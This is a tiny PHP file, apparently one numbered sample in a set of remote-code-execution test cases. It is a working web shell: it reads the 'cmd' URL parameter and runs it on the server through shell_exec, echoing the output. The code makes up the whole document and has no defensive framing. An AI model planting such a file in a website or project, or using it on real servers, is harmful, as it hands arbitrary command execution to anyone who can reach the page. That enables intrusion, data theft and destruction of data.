<?php
// RCE test variation #237
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>